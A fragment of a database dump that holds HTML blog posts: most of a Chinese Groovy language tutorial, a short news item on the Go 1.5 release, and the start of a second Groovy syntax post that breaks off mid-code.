Collection</p>\r\n\r\n<p>Groovy&nbsp;中这样来定义一个Collection：</p>\r\n\r\n<p><strong>def</strong>&nbsp;<strong>collect</strong>=[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;]</p>\r\n\r\n<p>除了声明时往集合中添加元素外，还可以用以下方式向集合中添加元素：</p>\r\n\r\n<p style=\"margin-left:21pt\"><strong>collect</strong>.add(1);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>collect</strong>&lt;&lt;&quot;come on&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>collect</strong>[<strong>collect</strong>.<strong>size()</strong>]=100.0</p>\r\n\r\n<p>Collection使用类似数组下标的方式进行检索：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[<strong>collect</strong>.<strong>size</strong>()-1]</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[5]</p>\r\n\r\n<p>groovy支持负索引：</p>\r\n\r\n<p style=\"margin-left:21pt\"><strong>println</strong>&nbsp;<strong>collect</strong>[-1]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//索引其倒数第1个元素</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[-2]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//索引其倒数第2个元素</p>\r\n\r\n<p>Collection支持集合运算：</p>\r\n\r\n<p style=\"margin-left:21pt\"><strong>collect</strong>=<strong>collect</strong>+5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//在集合中添加元素5</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[<strong>collect</strong>.<strong>size</strong>()-1]</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>collect</strong>=<strong>collect</strong>-&#39;a&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//在集合中减去元素a(第1个)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[0]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//现在第1个元素变成b了</p>\r\n\r\n<p>同样地，你可以往集合中添加另一个集合或删除一个集合：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>collect</strong>=<strong>collect</strong>-<strong>collect</strong>[0..4]&nbsp;&nbsp;&nbsp;//把集合中的前5个元素去掉</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[0]&nbsp;&nbsp;&nbsp;//现在集合中仅有一个元素，即原来的最后一个元素</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;<strong>collect</strong>[-1]&nbsp;&nbsp;//也可以用负索引，证明最后一个元素就是第一个元素</p>\r\n\r\n<p>(2) Map</p>\r\n\r\n<p>Map是&ldquo;键-值&rdquo;对的集合，在groovy中，键不一定是String，可以是任何对象(实际上Groovy中的Map就是java.util.<code>Linke dHashMap</code>)。</p>\r\n\r\n<p>如此可以定义一个Map:</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>def</strong>&nbsp;map=[&#39;name&#39;:&#39;john&#39;,&#39;age&#39;:14,&#39;sex&#39;:&#39;boy&#39;]</p>\r\n\r\n<p>添加项：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map=map+[&#39;weight&#39;:25]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//添加john的体重</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.put(&#39;length&#39;,1.27)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//添加john的身高</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.father=&#39;Keller&#39;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//添加john的父亲</p>\r\n\r\n<p>可以用两种方式检索值：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;map[&#39;father&#39;]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//通过key作为下标索引</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;map.length&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//通过key作为成员名索引</p>\r\n\r\n<p style=\"margin-left:18pt\">11、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闭包（Closure）</p>\r\n\r\n<p>闭包是用{符号括起来的代码块，它可以被单独运行或调用，也可以被命名。类似&lsquo;匿名类&rsquo;或内联函数的概念。</p>\r\n\r\n<p>闭包中最常见的应用是对集合进行迭代，下面定义了3个闭包对map进行了迭代：</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.<strong>each</strong>({key,value-&gt;&nbsp;&nbsp;&nbsp;&nbsp;//key,value两个参数用于接受每个元素的键/值</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;&quot;$key:$value&quot;})</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.<strong>each</strong>{<strong>println</strong>&nbsp;it}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//it是一个关键字，代表map集合的每个元素</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;map.<strong>each</strong>({&nbsp;<strong>println</strong>&nbsp;it.getKey()+&quot;--&gt;&quot;+it.getValue()})</p>\r\n\r\n<p>除了用于迭代之外，闭包也可以单独定义：</p>\r\n\r\n<p><strong>def</strong>&nbsp;say={word-&gt;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>println</strong>&nbsp;&quot;Hi,$word!&quot;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n<p>调用：</p>\r\n\r\n<p style=\"margin-left:21pt\">say(&#39;groovy&#39;)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;say.<strong>call</strong>(&#39;groovy&amp;grails&#39;)</p>\r\n\r\n<p>输出：</p>\r\n\r\n<p>Hi,groovy!</p>\r\n\r\n<p>Hi,groovy&amp;grails!</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>看起来，闭包类似于方法，需要定义参数和要执行的语句，它也可以通过名称被调用。然而闭包对象（不要奇怪，闭包也是对象）可以作为参数传递（比如前面的闭包作为参数传递给了map的each方法）。而在java中，要做到这一点并不容易（也许C++中的函数指针可以，但不要忘记java中没有指针）。其次，闭包也可以不命名（当然作为代价，只能在定义闭包时执行一次），而方法不可以。</p>\r\n\r\n<p style=\"margin-left:18pt\">12、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;类</p>\r\n\r\n<p>Groovy类和java类一样，你完全可以用标准java bean的语法定义一个groovy&nbsp;类。但作为另一种语言，我们可以使用更groovy的方式定义和使用类，这样的好处是，你可以少写一半以上的javabean代码：</p>\r\n\r\n<p style=\"margin-left:18pt\">(1)&nbsp;&nbsp;&nbsp;&nbsp;不需要public修饰符</p>\r\n\r\n<p>如前面所言，groovy的默认访问修饰符就是public，如果你的groovy类成员需要public修饰，则你根本不用写它。</p>\r\n\r\n<p style=\"margin-left:18pt\">(2)&nbsp;&nbsp;&nbsp;&nbsp;不需要类型说明</p>\r\n\r\n<p>同样前面也说过，groovy也不关心变量和方法参数的具体类型。</p>\r\n\r\n<p style=\"margin-left:18pt\">(3)&nbsp;&nbsp;&nbsp;&nbsp;不需要getter/setter方法</p>\r\n\r\n<p>不要奇怪，在很多ide（如eclipse）早就可以为序员自动产生getter/setter方法了。在groovy中，则彻底不需要getter/setter方法&mdash;&mdash;所有类成员（如果是默认的public）根本不用通过getter/setter方法引用它们（当然，如果你一定要通过get/set方法访问成员属性，groovy也提供了它们）。</p>\r\n\r\n<p style=\"margin-left:18pt\">(4)&nbsp;&nbsp;&nbsp;&nbsp;不需要构造函数</p>\r\n\r\n<p>不在需要程序员声明任何构造函数，因为groovy自动提供了足够你使用的构造函数。不用担心构造函数不够多，因为实际上只需要两个构造函数（1个不带参数的默认构造函数，1个只带一个map参数的构造函数&mdash;由于是map类型，通过这个参数你可以在构造对象时任意初始化它的成员变量）。</p>\r\n\r\n<p style=\"margin-left:18pt\">(5)&nbsp;&nbsp;&nbsp;&nbsp;不需要return</p>\r\n\r\n<p>Groovy中，方法不需要return来返回值吗？这个似乎很难理解。看后面的代码吧。</p>\r\n\r\n<p>因此，groovy风格的类是这样的：</p>\r\n\r\n<p style=\"margin-left:18pt\">(6)&nbsp;&nbsp;&nbsp;&nbsp;不需要()号</p>\r\n\r\n<p>Groovy中方法调用可以省略()号（构造函数除外），也就是说下面两句是等同的：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<pre>\r\nperson1.setName &#39;kk&#39;</pre>\r\n\r\n<pre>\r\nperson1.setName(&#39;kk&#39;)</pre>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p>下面看一个完整类定义的例子：</p>\r\n\r\n<p><strong>class</strong>&nbsp;Person {</p>\r\n\r\n<p>&nbsp;<strong>def</strong>&nbsp;name</p>\r\n\r\n<p>&nbsp;<strong>def</strong>&nbsp;age</p>\r\n\r\n<p>&nbsp;String toString(){//注意方法的类型String，因为我们要覆盖的方法为String类型</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;$name,$age&quot;</p>\r\n\r\n<p>&nbsp;}</p>\r\n\r\n<p>如果你使用javabean风格来做同样的事，起码代码量要增加1倍以上。</p>\r\n\r\n<p>我们可以使用默认构造方法实例化Person类：</p>\r\n\r\n<p><strong>def</strong>&nbsp;person1=<strong>new</strong>&nbsp;Person()</p>\r\n\r\n<p>person1.name=&#39;kk&#39;</p>\r\n\r\n<p>person1.age=20</p>\r\n\r\n<p><strong>println</strong>&nbsp;person1</p>\r\n\r\n<p>也可以用groovy的风格做同样的事：</p>\r\n\r\n<p><strong>def</strong>&nbsp;person2=<strong>new</strong>&nbsp;Person([&#39;name&#39;:&#39;gg&#39;,&#39;age&#39;:22])&nbsp;//[]号可以省略</p>\r\n\r\n<p><strong>println</strong>&nbsp;person2</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>这样需要注意我们覆盖了Object的toString方法，因为我们想通过println person1这样的方法简单地打印对象的属性值。</p>\r\n\r\n<p>然而toString&nbsp;方法中并没有return&nbsp;一个String，但不用担心，Groovy&nbsp;默认返回方法的最后一行的值。</p>\r\n\r\n<p style=\"margin-left:18pt\">13、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;？运算符</p>\r\n\r\n<p>在java中，有时候为了避免出现空指针异常，我们通常需要这样的技巧：</p>\r\n\r\n<p>if(rs!=null){</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rs.next()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&hellip; &hellip;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>在groovy中，可以使用?操作符达到同样的目的：</p>\r\n\r\n<p>rs?.next()</p>\r\n\r\n<p>?在这里是一个条件运算符，如果?前面的对象非null，执行后面的方法，否则什么也不做。</p>\r\n\r\n<p style=\"margin-left:18pt\">14、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可变参数</p>\r\n\r\n<p>等同于java 5中的变长参数。首先我们定义一个变长参数的方法sum：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">int sum(int... var) {\r\n\r\ndef total = 0\r\n\r\nfor (i in var)\r\n\r\ntotal += i\r\n\r\nreturn total\r\n\r\n}</code></pre>\r\n\r\n<p>我们可以在调用sum时使用任意个数的参数（1个，2个，3个&hellip;&hellip;）：</p>\r\n\r\n<p><strong>println</strong>&nbsp;sum(1)</p>\r\n\r\n<p><strong>println</strong>&nbsp;sum(1,2)</p>\r\n\r\n<p><strong>println</strong>&nbsp;sum(1,2,3)</p>\r\n\r\n<p style=\"margin-left:18pt\">15、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;枚举</p>\r\n\r\n<p>定义一个enum：</p>\r\n\r\n<p>enum Day {</p>\r\n\r\n<p>SUNDAY, MONDAY, TUESDAY, WEDNESDAY,</p>\r\n\r\n<p>THURSDAY, FRIDAY, SATURDAY</p>\r\n\r\n<p>}</p>\r\n\r\n<p>然后我们在switch语句中使用他：</p>\r\n\r\n<p><strong>def</strong>&nbsp;today = Day.SATURDAY</p>\r\n\r\n<p><strong>switch</strong>&nbsp;(today) {</p>\r\n\r\n<p>//Saturday&nbsp;or&nbsp;Sunday</p>\r\n\r\n<p><strong>case</strong>&nbsp;[Day.SATURDAY, Day.SUNDAY]:</p>\r\n\r\n<p><strong>println</strong>&nbsp;&quot;Weekends are cool&quot;</p>\r\n\r\n<p><strong>break</strong></p>\r\n\r\n<p>//a&nbsp;day&nbsp;between&nbsp;Monday&nbsp;and&nbsp;Friday</p>\r\n\r\n<p><strong>case</strong>&nbsp;Day.MONDAY..Day.FRIDAY:</p>\r\n\r\n<p><strong>println</strong>&nbsp;&quot;Boring work day&quot;</p>\r\n\r\n<p><strong>break</strong></p>\r\n\r\n<p><strong>default</strong>:</p>\r\n\r\n<p><strong>println</strong>&nbsp;&quot;Are you sure this is a valid day?&quot;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>注意，switch和case中可以使用任何对象，尤其是可以在case中使用List和范围，从而使分支满足多个条件（这点跟delphi有点象）。</p>\r\n\r\n<p>同java5一样，groovy支持带构造器、属性和方法的enum：</p>\r\n\r\n<p>enum Planet {</p>\r\n\r\n<p>MERCURY(3.303e+23,&nbsp;2.4397e6),</p>\r\n\r\n<p>VENUS(4.869e+24,&nbsp;6.0518e6),</p>\r\n\r\n<p>EARTH(5.976e+24,&nbsp;6.37814e6),</p>\r\n\r\n<p>MARS(6.421e+23,&nbsp;3.3972e6),</p>\r\n\r\n<p>JUPITER(1.9e+27,7.1492e7),</p>\r\n\r\n<p>SATURN(5.688e+26,&nbsp;6.0268e7),</p>\r\n\r\n<p>URANUS(8.686e+25,&nbsp;2.5559e7),</p>\r\n\r\n<p>NEPTUNE(1.024e+26,&nbsp;2.4746e7)</p>\r\n\r\n<p><strong>double</strong>&nbsp;mass</p>\r\n\r\n<p><strong>double</strong>&nbsp;radius</p>\r\n\r\n<p>Planet(<strong>double</strong>&nbsp;mass,&nbsp;<strong>double</strong>&nbsp;radius) {</p>\r\n\r\n<p><strong>this</strong>.mass = mass;</p>\r\n\r\n<p><strong>this</strong>.radius = radius;</p>\r\n\r\n<p>}</p>\r\n\r\n<p><strong>void</strong>&nbsp;printMe() {</p>\r\n\r\n<p><strong>println</strong>&nbsp;&quot;${name()} has a mass of ${mass} &quot;&nbsp;+</p>\r\n\r\n<p>&quot;and a radius of ${radius}&quot;</p>\r\n\r\n<p>}</p>\r\n\r\n<p>}</p>\r\n\r\n<p>Planet.EARTH.printMe()</p>\r\n\r\n<p style=\"margin-left:18pt\">16、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Elvis操作符</p>\r\n\r\n<p>这是三目运算符&ldquo;?:&rdquo;的简单形式，三目运算符通常以这种形式出现：</p>\r\n\r\n<p>String displayName = name != null ? name : &quot;Unknown&quot;;</p>\r\n\r\n<p>在groovy中，也可以简化为（因为null在groovy中可以转化为布尔值false）：</p>\r\n\r\n<p>String displayName = name ? name : &quot;Unknown&quot;;</p>\r\n\r\n<p>基于&ldquo;不重复&rdquo;的原则，可以使用elvis操作符再次简化为：</p>\r\n\r\n<p>String displayName = name ?: &quot;Unknown&quot;</p>\r\n\r\n<p style=\"margin-left:18pt\">17、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;动态性</p>\r\n\r\n<p>Groovy所有的对象都有一个元类metaClass，我们可以通过metaClass属性访问该元类。通过元类，可以为这个对象增加方法（在java中不可想象）！见下面的代码，msg是一个String,通过元类，我们为msg增加了一个String&nbsp;类中所没有的方法up：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">def msg = \"Hello!\"\r\n\r\nprintln msg.metaClass\r\n\r\nString.metaClass.up = {  delegate.toUpperCase() }\r\n\r\nprintln msg.up()</code></pre>\r\n\r\n<p>通过元类，我们还可以检索对象所拥有的方法和属性（就象反射）：</p>\r\n\r\n<p>msg.metaClass.methods.<strong>each</strong>&nbsp;{&nbsp;<strong>println</strong>&nbsp;it.name }</p>\r\n\r\n<p>msg.metaClass.properties.<strong>each</strong>&nbsp;{&nbsp;<strong>println</strong>&nbsp;it.name }</p>\r\n\r\n<p>甚至我们可以看到我们刚才添加的up方法。</p>\r\n\r\n<p>我们可以通过元类判断有没有一个叫up的方法，然后再调用它：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">if (msg.metaClass.respondsTo(msg, \'up\')) {\r\n\r\n    println msg.toUpperCase()\r\n\r\n}</code></pre>\r\n\r\n<p>当然，也可以推断它有没有一个叫bytes的属性：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">if (msg.metaClass.hasProperty(msg, \'bytes\')) {\r\n\r\n    println msg.bytes.encodeBase64()\r\n\r\n}</code></pre>\r\n\r\n<p style=\"margin-left:18pt\">18、&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Groovy swing</p>\r\n\r\n<p>到现在为止，我们的groovy一直都在控制台窗口下工作。如果你还不满足，当然也可以使用swingbuilder来构建程序：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">import groovy.swing.SwingBuilder\r\n\r\nimport java.awt.BorderLayout\r\n\r\nimport groovy.swing.SwingBuilder\r\n\r\nimport java.awt.BorderLayout as BL\r\n\r\ndef swing = new SwingBuilder()\r\n\r\ncount = 0\r\n\r\ndef textlabel\r\n\r\ndef frame = swing.frame(title:\'Frame\', size:[300,300]) {\r\n\r\nborderLayout()\r\n\r\ntextlabel = label(text:\"Clicked ${count} time(s).\",\r\n\r\nconstraints: BL.NORTH)\r\n\r\nbutton(text:\'Click Me\',\r\n\r\nactionPerformed: {count++; textlabel.text =\r\n\r\n\"Clicked ${count} time(s).\"; println \"clicked\"},\r\n\r\nconstraints:BorderLayout.SOUTH)\r\n\r\n}\r\n\r\nframe.pack()\r\n\r\nframe.show()</code></pre>\r\n\r\n<p>怎么样？是不是跟java&nbsp;中写swing程序很象？</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p style=\"margin-left:21pt\">五、单元测试</p>\r\n\r\n<p style=\"margin-left:18pt\">1、&nbsp;&nbsp;添加junit</p>\r\n\r\n<p>使用&nbsp;Build Path&agrave;Add Libraries...&nbsp;把junit添加到项目中。</p>\r\n\r\n<p style=\"margin-left:18pt\">2、&nbsp;&nbsp;新建测试</p>\r\n\r\n<p>使用&nbsp;New&nbsp;&agrave;&nbsp;Junit Test Case&nbsp;新建测试例程：PersonTest，在Class under test右边的Browser按钮，选择要进行测试的groovy类Person。</p>\r\n\r\n<p>Finish，下面编写测试用例代码（我使用了Junit4）：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">import org.junit.*;\r\n\r\npublic class TestPerson {\r\n\r\n       @Test\r\n\r\n       public void testToString(){\r\n\r\n              Person p=new Person();              //注意因为groovy编译Person时默认所有属性为private\r\n\r\n              p.setName(\"ddd\");                //所以用set方法设置name属性而不用p.name=”ddd”\r\n\r\n              p.setAge(18);\r\n\r\n              Assert.assertEquals(\"ddd-18\", p.toString());\r\n\r\n       }\r\n\r\n}</code></pre>\r\n\r\n<p>运行Run As&agrave;Junit Test，发现testToString通过测试。</p>\r\n\r\n<p>3、使用groovy书写测试用例</p>\r\n\r\n<p>除了使用Java来书写测试用例以外，我们也可以使用groovy书写。</p>\r\n\r\n<p>New&nbsp;&agrave;&nbsp;Other&nbsp;&agrave;&nbsp;Groovy&nbsp;&agrave;&nbsp;Groovy Class，写一个类GroovyTestPerson：</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">import org.junit.*;\r\n\r\n\r\n\r\nclass GroovyTestPerson {\r\n\r\n    @Test\r\n\r\n     void testToString(){\r\n\r\n       Person p=new Person(\"name\":\"ddd\",\"age\":18)\r\n\r\n       Assert.assertEquals(\"ddd-18\", p.toString())\r\n\r\n    }\r\n\r\n}</code></pre>\r\n\r\n<p>可以看到，这里使用的完全是Groovy风格的书写方式：不需要public，使用map参数构造对象。然而当你Run As&agrave;Junit Test的时候，结果跟用java编写的测试用例没有什么两样。</p>\r\n\r\n<p>这也充分说明了，groovy和java，除了语法不一样，本质上没有什么区别（对比.net framework中的C#和VB.net，它们除了语法不同外，本质上它们都使用CLR）。</p>\r\n\r\n<p>&nbsp;</p>\r\n',0,0,'Groovy入门教程',203,NULL,0),(67,0,'20150823091640',2,'<p><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">今日，Google官方终于发布了</span><a href=\"https://golang.org/doc/go1.5\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.1875px; background-color: rgb(247, 247, 247);\" target=\"_blank\">Go 1.5</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">版本，这是Go语言的第六个重要版本。该版本在本次更新中移除了&ldquo;最后残余的C代码&rdquo;，Runtime（运行时）、Compiler（编译器）和Linker（连接器）均是由Go语言所编写。目前，Go 1.5现已开放下载并支持Windows、Mac OS X和Linux平台。&nbsp;</span></p>\r\n\r\n<p><br />\r\n<img src=\"http://dl2.iteye.com/upload/attachment/0111/1035/711e369a-717c-3fe9-a331-ad10e0acc2a3.jpg\" style=\"border:0px\" />&nbsp;</p>\r\n\r\n<p><br />\r\n<strong>主要特性如下：</strong><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">&nbsp;</span></p>\r\n\r\n<ul>\r\n	<li>编译器和运行时已完全使用Go编写，彻底移除C语言；</li>\r\n	<li>垃圾收集器现可并行运行，显著降低了收集器的停顿时间；</li>\r\n	<li>Go程序默认以最大可用内核数量运行（GOMAXPROCS set），之前版本中默认为1；</li>\r\n	<li>所有资源库（repositories）现已支持内部包，而不仅仅是Go的核心部分；</li>\r\n	<li>go命令现提供对&ldquo;vendoring&rdquo;外部依赖的&ldquo;实验性支持&rdquo;；</li>\r\n	<li>新加入的go指令追踪工具可对程序执行细粒度良好的追踪；</li>\r\n	<li>新加入的go doc指令（与godoc有区别）可在命令行中专门使用。</li>\r\n	<li>改进 linker，允许分布式 Go 包作为分享库链接到 Go 程序，可以构建 Go 包到归档或者分享库，可以链接或者通过 C 程序加载 (design doc)。</li>\r\n</ul>\r\n\r\n<p><br />\r\n<span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">更多详细内容，请见：</span><a href=\"https://golang.org/doc/go1.5\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.1875px; background-color: rgb(247, 247, 247);\" target=\"_blank\">Go官方主页</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">、下载</span><a href=\"https://golang.org/dl/\" style=\"color: rgb(0, 102, 153); font-family: Helvetica, Tahoma, Arial, sans-serif; font-size: 14px; line-height: 25.1875px; background-color: rgb(247, 247, 247);\" target=\"_blank\">Go 1.5</a><span style=\"background-color:rgb(247, 247, 247); color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">。</span></p>\r\n',0,0,' Go 1.5如期发布，完全告别C代码',27,NULL,0),(5,0,'20150605195311',2,'<p>过去半年都在写Groovy，基本都是在实战中学习，从java转过来，也还没什么问题，毕竟基础，架构都没变。</p>\r\n\r\n<p>Groovy的强大特性中，Closure，MetaClass都尝试过，Closure基本上就是当方法或者回调接口使用，再高级的用法就没用过了，没有特别体会什么好处，当回调接口就是省的定义接口，简洁了一些；MetaClass就有专门为一个模块做了些MetaClass，和GORM差不多的，给一些类加了save，update，delete之类的方法，不同的是GORM是存到数据库，我做的那模块是调用Restful Service，还不错，如果有需求是不能改变类而要给类加方法，还是很适用的。但是在绝大部分情况下，这些优势都体现不出来，到目前位置，还是对Groovy的一些语法印象深刻些，总结一些常用的语法：</p>\r\n\r\n<p><strong>1.List，和Map的初始化</strong></p>\r\n\r\n<p>这个用的最多了，原来java的时候，非要新建一个List或者Map，然后把element一个一个加进去，特繁琐。用Groovy在语法上简洁了很多。</p>\r\n\r\n<p>定义一个List：&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">List&nbsp;intList&nbsp;=&nbsp;[</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">1</span><span style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">3</span><span style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">5</span><span style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">7</span><span style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">9</span><span style=\"background-color:inherit\">]&nbsp;&nbsp;</span></span></li>\r\n	<li><span style=\"background-color:inherit; color:black\">List&nbsp;stringList&nbsp;=&nbsp;[<span style=\"background-color:inherit; color:blue\">&#39;a&#39;</span><span style=\"background-color:inherit\">,&nbsp;</span><span style=\"background-color:inherit; color:blue\">&#39;b&#39;</span><span style=\"background-color:inherit\">,</span><span style=\"background-color:inherit; color:blue\">&#39;&#39;</span><span style=\"background-color:inherit\">]&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<p><br />\r\n<span style=\"font-family:arial; font-size:14px\">定义一个Map：</span></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">Map&nbsp;map&nbsp;=&nbsp;[a:</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">4</span><span style=\"background-color:inherit\">,b:</span><span style=\"background-color:inherit; color:blue\">&#39;d&#39;</span><span style=\"background-color:inherit\">]&nbsp;&nbsp;</span></span></li>\r\n</ol>\r\n\r\n<pre>\r\n\r\n&nbsp;</pre>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>定义Map的时候，对于key，如果像上面的例子一样，没有特别指示，那所有key都是String类型的，key值就是&lsquo;a&rsquo;,&#39;b&#39;，上面的例子等价于</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p><strong>[java]</strong>&nbsp;view plaincopy</p>\r\n\r\n<ol start=\"1\">\r\n	<li><span style=\"background-color:inherit; color:black\"><span style=\"background-color:inherit\">Map&nbsp;map&nbsp;=&nbsp;[</span><span style=\"background-color:inherit; color:blue\">&#39;a&#39;</span><span style=\"background-color:inherit\">:</span><span style=\"background-color:inherit; color:rgb(192, 0, 0)\">4</span><span 